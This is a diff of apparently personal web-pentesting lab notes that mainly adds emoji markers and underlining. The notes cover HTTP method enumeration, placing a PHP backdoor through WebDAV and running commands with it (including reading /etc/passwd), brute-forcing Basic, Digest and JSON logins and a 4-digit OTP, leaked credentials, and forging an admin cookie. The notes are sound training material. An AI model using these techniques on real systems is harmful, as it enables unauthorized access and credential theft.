@@ -46,11 +46,11 @@ This course is designed to equip you with the knowledge and skills needed to ide
 
 **HTTP Method Enumeration**
 
-This lab focuses on enumerating and testing HTTP methods on a web server. You will learn to interact with various web pages of the application to discover supported HTTP methods and explore the potential for unauthorized actions like file uploads and deletions.
+<u>This lab focuses on enumerating and testing HTTP methods on a web server</u>. You will learn to interact with various web pages of the application to discover supported HTTP methods and explore the potential for unauthorized actions like file uploads and deletions.
 
 In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at `demo.ine.local`.
 
-**Objective:** To understand and identify the HTTP methods supported by different web pages within a web application
+**Objective:** <u>Identify the HTTP methods supported by different web pages within a web application</u>.
 
 #### Lab Solution
 
@@ -61,7 +61,7 @@ In this lab environment, you will be provided with GUI access to a Kali machine.
 * IPv4: 192.48.93.3
 *   Trying 192.48.93.3:80...
 * Connected to demo.ine.local (192.48.93.3) port 80
-> GET / HTTP/1.1 📌
+> GET📌 / HTTP/1.1
 > Host: demo.ine.local
 > User-Agent: curl/8.8.0
 > Accept: */*
@@ -93,7 +93,7 @@ In this lab environment, you will be provided with GUI access to a Kali machine.
 * IPv4: 192.48.93.3
 *   Trying 192.48.93.3:80...
 * Connected to demo.ine.local (192.48.93.3) port 80
-> POST / HTTP/1.1 📌
+> POST📌 / HTTP/1.1
 > Host: demo.ine.local
 > User-Agent: curl/8.8.0
 > Accept: */*
@@ -112,7 +112,7 @@ In this lab environment, you will be provided with GUI access to a Kali machine.
 < 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
-<title>405 Method Not Allowed</title> 📌
+<title>405 Method Not Allowed</title>📌
 </head><body>
 <h1>Method Not Allowed</h1>
 <p>The requested method POST is not allowed for the URL /.</p>
@@ -127,7 +127,7 @@ In this lab environment, you will be provided with GUI access to a Kali machine.
 * IPv4: 192.48.93.3
 *   Trying 192.48.93.3:80...
 * Connected to demo.ine.local (192.48.93.3) port 80
-> OPTIONS / HTTP/1.1 📌
+> OPTIONS📌 / HTTP/1.1
 > Host: demo.ine.local
 > User-Agent: curl/8.8.0
 > Accept: */*
@@ -141,7 +141,7 @@ In this lab environment, you will be provided with GUI access to a Kali machine.
 < Expires: Thu, 19 Nov 1981 08:52:00 GMT
 < Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
 < Pragma: no-cache
-< Allow: GET,HEAD,OPTIONS 📌
+< Allow: GET,HEAD,OPTIONS📌
 < Content-Length: 0
 < Content-Type: text/html
 < 
@@ -174,7 +174,7 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://demo.ine.local/mail/
 + http://demo.ine.local/phpinfo.php (CODE:200|SIZE:74363)
 + http://demo.ine.local/server-status (CODE:403|SIZE:215)
-==> DIRECTORY: http://demo.ine.local/uploads/ 📌
+==> DIRECTORY: http://demo.ine.local/uploads/📌
 ==> DIRECTORY: http://demo.ine.local/vendor/
 
 ---- Entering directory: http://demo.ine.local/css/ ----
@@ -225,7 +225,7 @@ DOWNLOADED: 4612 - FOUND: 6
 < DAV: 1,2
 < DAV: <http://apache.org/dav/propset/fs/1>
 < MS-Author-Via: DAV
-< Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK 📌
+< Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK📌
 < Content-Length: 0
 < Content-Type: httpd/unix-directory
 < 
@@ -284,7 +284,7 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
    <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
    <tr><th colspan="5"><hr></th></tr>
 <tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
-<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="shell.php">shell.php</a></td><td align="right">2024-11-27 12:25  </td><td align="right">328 </td><td>&nbsp;</td></tr> 📌
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="shell.php">shell.php📌</a></td><td align="right">2024-11-27 12:25  </td><td align="right">328 </td><td>&nbsp;</td></tr>📌
    <tr><th colspan="5"><hr></th></tr>
 </table>
 </body></html>
@@ -295,7 +295,7 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</pre> 🚩
+</pre>🚩
 ```
 
 `curl -X DELETE http://demo.ine.local/uploads/shell.php`
@@ -310,7 +310,7 @@ Web Application Pentesting Tools can prove to be very helpful while performing p
 
 In this lab exercise, we will take a look at how to use [Burp Suite](https://portswigger.net/support/burp-suite-tools) to perform a dictionary attack on HTTP Basic authentication protected directories.
 
-**Objective**: Perform Dictionary Attack on the password-protected directory `/basic`.
+**Objective**: <u>Perform Dictionary Attack on the password-protected directory `/basic`</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -325,7 +325,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.76.240.2 📌 netmask 255.255.255.0  broadcast 192.76.240.255
+        inet 192.76.240.2📌 netmask 255.255.255.0  broadcast 192.76.240.255
         ether 02:42:c0:4c:f0:02  txqueuelen 0  (Ethernet)
         RX packets 17  bytes 1446 (1.4 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -339,7 +339,7 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 `HTTP Request`:
 ```http
-GET /basic HTTP/1.1
+GET /basic📌 HTTP/1.1
 Host: 192.76.240.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -351,10 +351,10 @@ Upgrade-Insecure-Requests: 1
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 401 Unauthorized
+HTTP/1.1 401 Unauthorized📌
 Date: Wed, 27 Nov 2024 12:41:03 GMT
 Server: Apache/2.4.7 (Ubuntu)
-WWW-Authenticate: Basic realm="private" 📌
+WWW-Authenticate: Basic realm="private"📌
 Content-Length: 458
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -363,7 +363,7 @@ Content-Type: text/html; charset=iso-8859-1
 <html><head>
 <title>401 Unauthorized</title>
 </head><body>
-<h1>Unauthorized</h1>
+<h1>Unauthorized</h1>📌
 <p>This server could not verify that you
 are authorized to access the document
 requested.  Either you supplied the wrong
@@ -374,12 +374,13 @@ the credentials required.</p>
 <address>Apache/2.4.7 (Ubuntu) Server at 192.76.240.3 Port 80</address>
 </body></html>
 ```
+❌
 
 `burpsuite` > `Proxy`
 
 `HTTP Request`:
 ```http
-GET /basic HTTP/1.1
+GET /basic📌 HTTP/1.1
 Host: 192.76.240.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -388,7 +389,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
 Upgrade-Insecure-Requests: 1
-Authorization: Basic dGVzdDp0ZXN0 📌
+Authorization: Basic dGVzdDp0ZXN0📌
 ```
 
 `echo -n 'dGVzdDp0ZXN0' | base64 -d`:
@@ -396,11 +397,11 @@ Authorization: Basic dGVzdDp0ZXN0 📌
 test:test
 ```
 
-`burpsuite` > `Intruder` > `Payloads` = `Payload Options: Load: /root/Desktop/wordlists/100-common-passwords.txt` = `Payload Processing: Add: Add Prefix: admin:` = `Payload Processing: Add: Base64-encode`> `Start attack`
+`burpsuite` > `Intruder` > `Payloads` = `Payload Options: Load: /root/Desktop/wordlists/100-common-passwords.txt` = `Payload Processing: Add: Add Prefix: admin:` = `Payload Processing: Add: Base64-encode` > `Start attack`
 
 `HTTP Request`:
 ```http
-GET /basic HTTP/1.1
+GET /basic📌 HTTP/1.1
 Host: 192.76.240.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -409,11 +410,11 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
 Upgrade-Insecure-Requests: 1
-Authorization: Basic §password§
+Authorization: Basic §password§📌
 ```
 `HTTP Request`:
 ```http
-GET /basic HTTP/1.1
+GET /basic📌 HTTP/1.1
 Host: 192.76.240.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -422,11 +423,11 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
 Upgrade-Insecure-Requests: 1
-Authorization: Basic YWRtaW46Y29va2llMQ%3d%3d 📌
+Authorization: Basic YWRtaW46Y29va2llMQ%3d%3d📌
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 301 Moved Permanently 📌
+HTTP/1.1 301📌 Moved Permanently
 Date: Wed, 27 Nov 2024 13:15:23 GMT
 Server: Apache/2.4.7 (Ubuntu)
 Location: http://192.76.240.3/basic/
@@ -457,7 +458,7 @@ YWRtaW46Y29va2llMQ==
 ```
 `Decode as: Base64`:
 ```
-admin:cookie1 🔑
+admin:cookie1🔑
 ```
 
 ### Attacking HTTP Digest Authentication
@@ -470,7 +471,7 @@ Web Application Pentesting Tools can prove to be very helpful while performing p
 
 In this lab exercise, we will take a look at how to use [hydra](https://github.com/vanhauser-thc/thc-hydra) to perform a dictionary attack on HTTP authentication protected directories.
 
-**Objective**: Perform Dictionary Attack on password-protected directory `/basic` and `/digest`.
+**Objective**: <u>Perform Dictionary Attack on password-protected directory `/basic` and `/digest`</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -485,7 +486,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.208.248.2 📌 netmask 255.255.255.0  broadcast 192.208.248.255
+        inet 192.208.248.2📌 netmask 255.255.255.0  broadcast 192.208.248.255
         ether 02:42:c0:d0:f8:02  txqueuelen 0  (Ethernet)
         RX packets 15  bytes 1306 (1.2 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -499,7 +500,7 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 `HTTP Request`:
 ```http
-GET /digest/ HTTP/1.1
+GET /digest/📌 HTTP/1.1
 Host: 192.208.248.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -508,7 +509,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: PHPSESSID=gbrcvk76tf3s352m0jtv2140e5
 Upgrade-Insecure-Requests: 1
-Authorization: Digest username="test", realm="Private", nonce="ohX4B+UnBgA=79534fad29d28769f505132a196ee1be8ee5e6ec", uri="/digest/", algorithm=MD5, response="32d47cc70550372817022ba32099cadb", qop=auth, nc=00000001, cnonce="b25d92b8eb924ca3" 📌
+Authorization: Digest📌 username="test", realm="Private", nonce="ohX4B+UnBgA=79534fad29d28769f505132a196ee1be8ee5e6ec", uri="/digest/", algorithm=MD5, response="32d47cc70550372817022ba32099cadb", qop=auth, nc=00000001, cnonce="b25d92b8eb924ca3"
 ```
 
 `hydra -l 'admin' -P /root/Desktop/wordlists/100-common-passwords.txt 192.208.248.3 http-get /digest/`:
@@ -518,7 +519,7 @@ Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-27 19:09:41
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
 [DATA] attacking http-get://192.208.248.3:80/digest/
-[80][http-get] host: 192.208.248.3   login: admin   password: adminpasswd 🔑
+[80][http-get] host: 192.208.248.3   login: admin   password: adminpasswd🔑
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-27 19:09:43
 ```
@@ -535,9 +536,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-27 19:09:
 
 Apache is probably the most popular web server on the World Wide Web with millions of deployments! In this series of challenges, we hope to explore how attackers can exploit webapps running on Apache  arising due to server misconfigurations and/or application vulnerabilities. Take a look at the scenario below.
 
-The target server is hosting a web app. The web app is not vulnerable but the directory listing enabled on the server. And, that can lead to sensitive information leakage.
+The target server is hosting a web app. <u>The web app is not vulnerable but the directory listing enabled on the server. And, that can lead to sensitive information leakage</u>.
 
-**Objective**: Your objective is to login into the webapp as 'admin' user and retrieve the flag!
+**Objective**: <u>Your objective is to login into the webapp as `admin` user and retrieve the flag</u>.
 
 #### Lab Solution
 
@@ -561,13 +562,13 @@ GENERATED WORDS: 959
 + https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/composer (CODE:200|SIZE:403)                                                                                   
 ==> DIRECTORY: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/docs/                                                                                             
 + https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/logo (CODE:200|SIZE:14598)                                                                                     
-==> DIRECTORY: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/ 📌                                                                                        
+==> DIRECTORY: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/📌                                                                                        
 ---- Entering directory: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/docs/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)
 
 ---- Entering directory: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it. 📌                       
+(!) WARNING: Directory IS LISTABLE. No need to scan it.📌                       
     (Use mode '-w' if you want to scan it anyway)
 
 -----------------
@@ -601,7 +602,7 @@ DOWNLOADED: 959 - FOUND: 3
 + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
 + /phpinfo.php: Output from the phpinfo() function was found.
 + /config.php: PHP Config file may contain database IDs and passwords.
-+ /public/: Directory indexing found. 📌
++ /public/: Directory indexing found.📌
 + /public/: This might be interesting.
 
 [...]
@@ -620,7 +621,7 @@ DOWNLOADED: 959 - FOUND: 3
    <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
    <tr><th colspan="5"><hr></th></tr>
 <tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
-<tr><td valign="top"><img src="/icons/script.gif" alt="[   ]"></td><td><a href="cred.conf">cred.conf</a></td><td align="right">2018-08-25 10:59  </td><td align="right"> 56 </td><td>&nbsp;</td></tr> 📌
+<tr><td valign="top"><img src="/icons/script.gif" alt="[   ]"></td><td><a href="cred.conf">cred.conf📌</a></td><td align="right">2018-08-25 10:59  </td><td align="right"> 56 </td><td>&nbsp;</td></tr> 
 <tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="themes/">themes/</a></td><td align="right">2018-07-20 18:02  </td><td align="right">  - </td><td>&nbsp;</td></tr>
    <tr><th colspan="5"><hr></th></tr>
 </table>
@@ -632,7 +633,7 @@ DOWNLOADED: 959 - FOUND: 3
 ```html
 url="?/admin/login"
 user:admin
-password:$k@d00$#@123456 🔑
+password:$k@d00$#@123456🔑
 ```
 
 ---
@@ -647,9 +648,9 @@ password:$k@d00$#@123456 🔑
 
 [OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.
 
-In the exercise, we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application.
+In the exercise, <u>we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application</u>.
 
-**Objective**: Leverage the broken authentication vulnerability and access the administrative portal.
+**Objective**: <u>Leverage the broken authentication vulnerability and access the administrative portal</u>.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -664,7 +665,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.141.40.2 📌 netmask 255.255.255.0  broadcast 192.141.40.255
+        inet 192.141.40.2📌 netmask 255.255.255.0  broadcast 192.141.40.255
         ether 02:42:c0:8d:28:02  txqueuelen 0  (Ethernet)
         RX packets 143  bytes 589073 (575.2 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -678,8 +679,8 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 `HTTP Request`:
 ```http
-POST /login HTTP/1.1
-Host: 192.141.40.3:8000 📌
+POST /login📌 HTTP/1.1
+Host: 192.141.40.3:8000📌
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
 Accept-Language: en-US,en;q=0.5
@@ -690,14 +691,14 @@ Content-Length: 47
 Origin: http://secure-bank.com:5000
 Connection: close
 
-{"email":"admin@secbank.com","password":"TEST"} 📌
+{"email":"admin@secbank.com","password":"TEST"}📌
 ```
 
 `burpsuite` > `Intruder` > `Payloads` = `Load: /root/Desktop/wordlists/100-common-passwords.txt` > `Start attack`
 
 `HTTP Request`:
 ```http
-POST /login HTTP/1.1
+POST /login📌 HTTP/1.1
 Host: 192.141.40.3:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
@@ -709,7 +710,7 @@ Content-Length: 52
 Origin: http://secure-bank.com:5000
 Connection: close
 
-{"email":"admin@secbank.com","password":"§password§"}
+{"email":"admin@secbank.com","password":"§password§"}📌
 ```
 `HTTP Request`:
 ```http
@@ -725,7 +726,7 @@ Content-Length: 52
 Origin: http://secure-bank.com:5000
 Connection: close
 
-{"email":"admin@secbank.com","password":"christmas"} 🔑
+{"email":"admin@secbank.com","password":"christmas"}🔑
 ```
 `HTTP Response`:
 ```http
@@ -746,11 +747,11 @@ Date: Wed, 27 Nov 2024 14:13:05 GMT
 
 **Unlimited Attempts**
 
-Over the past few years, web application developers have migrated from traditional architecture to API-driven architecture.  The authentication, authorization, sensitive data, etc are being handled by APIs these days. A misconfiguration or a vulnerability is all an attacker needs to do significant damage.
+Over the past few years, web application developers have migrated from traditional architecture to API-driven architecture. The authentication, authorization, sensitive data, etc are being handled by APIs these days. A misconfiguration or a vulnerability is all an attacker needs to do significant damage.
 
-In this lab, we will take a look at how the lack of rate-limiting could be leveraged to perform brute force attacks and bypass authentication.
+In this lab, <u>we will take a look at how the lack of rate-limiting could be leveraged to perform brute force attacks and bypass authentication</u>.
 
-**Objective**: Brute force the 4 digit one-time password and bypass the authentication. 
+**Objective**: <u>Brute force the 4 digit one-time password and bypass the authentication</u>.
 
 URL: `https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev`.
 
@@ -762,7 +763,7 @@ URL: `https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev`.
 
 `HTTP Request`:
 ```http
-POST /dev/verify HTTP/1.1 📌
+POST /dev/verify📌 HTTP/1.1 
 Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: application/json, text/javascript, */*; q=0.01
@@ -776,7 +777,7 @@ Connection: close
 Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev
 Cookie: SESSIONID=Z0FBQUFBQm5SeXNyVC1yNXpRSF95dlY2ZjlDNHNxcUs3a0tnQjVZNk5ITWF2NjB6N000c2NEcV9BbVhhVGxHMWtZaFNtYy13Tmx2S3VMcjUwU1lvU0pFQ1djMHNtRnQ2VUE9PQ==
 
-{"sessionid":"Z0FBQUFBQm5SeXNyVC1yNXpRSF95dlY2ZjlDNHNxcUs3a0tnQjVZNk5ITWF2NjB6N000c2NEcV9BbVhhVGxHMWtZaFNtYy13Tmx2S3VMcjUwU1lvU0pFQ1djMHNtRnQ2VUE9PQ==","otp":"1234"} 📌
+{"sessionid":"Z0FBQUFBQm5SeXNyVC1yNXpRSF95dlY2ZjlDNHNxcUs3a0tnQjVZNk5ITWF2NjB6N000c2NEcV9BbVhhVGxHMWtZaFNtYy13Tmx2S3VMcjUwU1lvU0pFQ1djMHNtRnQ2VUE9PQ==","otp":"1234"}📌
 ```
 
 `zaproxy` > `Fuzzer` > `Fuzz Locations` = `Add` = `Type: Numberzz`, `From: 1000`, `To: 9999`, `Increment: 1` > `Message Processors` = `Add` = `Type: Tag Creator`, `Match: Regex: .*failed*.`, `Tag: Failed` > `Start Fuzzer`
@@ -796,9 +797,9 @@ Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev?otp=123
 Cookie: SESSIONID=Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==
 Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
 
-{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"§1234§"} 📌
+{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"§1234§"}📌
 ```
-`HTTP Request`:
+`HTTP Response:
 ```http
 POST https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev/verify HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -813,7 +814,7 @@ Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev?otp=123
 Cookie: SESSIONID=Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==
 Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
 
-{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"2999"} 🔑
+{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"2999"}🔑
 ```
 
 ---
@@ -828,9 +829,9 @@ Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
 
 [OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.
 
-In the exercise, we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application.
+In the exercise, <u>we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application</u>.
 
-**Objective**: Leverage the broken authentication vulnerability and access the administrative portal.
+**Objective**: <u>Leverage the broken authentication vulnerability and access the administrative portal</u>.
 
 The following credentials might be needed:
 - Username: "james@secbank.com"
@@ -844,7 +845,7 @@ The following credentials might be needed:
 
 `HTTP Request`:
 ```http
-POST /login HTTP/1.1
+POST /login📌 HTTP/1.1
 Host: 192.228.47.3:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
@@ -856,14 +857,14 @@ Content-Length: 47
 Origin: http://secure-bank.com:5000
 Connection: close
 
-{"email":"james@secbank.com","password":"password1"} 📌
+{"email":"james@secbank.com","password":"password1"}📌
 ```
 `HTTP Response`:
 ```http
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
 Content-Length: 20
-Set-Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1GYWxzZQ==; Path=/ 📌
+Set-Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1GYWxzZQ==📌; Path=/
 Access-Control-Allow-Origin: http://secure-bank.com:5000
 Vary: Origin
 Access-Control-Allow-Credentials: true
@@ -880,14 +881,14 @@ loggedin=True;admin=False
 
 `echo -n 'loggedin=True;admin=True' | base64`:
 ```
-bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl 🚩
+bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl
 ```
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-POST /login HTTP/1.1
+POST /login📌 HTTP/1.1
 Host: 192.228.47.3:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
@@ -898,9 +899,9 @@ Content-Type: application/json;charset=utf-8
 Content-Length: 47
 Origin: http://secure-bank.com:5000
 Connection: close
-Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl 📌
+Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl📌
 
-{"email":"james@secbank.com","password":"password1"}
+{"email":"james@secbank.com","password":"password1"}📌
 ```
 `HTTP Response`:
 ```http
@@ -913,7 +914,7 @@ Access-Control-Allow-Credentials: true
 Server: Werkzeug/1.0.1 Python/2.7.17
 Date: Wed, 27 Nov 2024 15:13:33 GMT
 
-{"flag": "251e2203c108d0a8eb1a9572199d24d1"} 🚩
+{"flag": "251e2203c108d0a8eb1a9572199d24d1"}🚩
 ```
 
 ---
@@ -926,9 +927,9 @@ Date: Wed, 27 Nov 2024 15:13:33 GMT
 
 **Advanced Electron Forum**
 
-In this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to a CSRF attack. So you can try to find this CSRF as purely academic exercise.
+In this exercise, <u>the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to a CSRF attack</u>. So you can try to find this CSRF as purely academic exercise.
 
-A version of **Advanced Electron Forum** is vulnerable to cross site request forgery attack.
+<u>A version of `Advanced Electron Forum` is vulnerable to cross site request forgery attack</u>.
 
 The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access:
 - Username: "admin"
@@ -955,7 +956,7 @@ URL: `https://wij0p8tlyeqrezvx1057worm8.eu-central-7.attackdefensecloudlabs.com
 -------------------------------------------------------------------------------------- ---------------------------------
 Advanced Electron Forum 1.0.6 - 'beg' Cross-Site Scripting                            | php/webapps/31677.txt
 Advanced Electron Forum 1.0.6 - Remote Code Execution                                 | php/webapps/6499.txt
-Advanced Electron Forum 1.0.9 - Cross-Site Request Forgery 📌                         | php/webapps/39261.txt
+Advanced Electron Forum 1.0.9 - Cross-Site Request Forgery📌                         | php/webapps/39261.txt
 Advanced Electron Forum 1.0.9 - Persistent Cross-Site Scripting                       | php/webapps/39262.txt
 Advanced Electron Forum 1.0.9 - Remote File Inclusion / Cross-Site Request Forgery    | php/webapps/39263.txt
 -------------------------------------------------------------------------------------- ---------------------------------
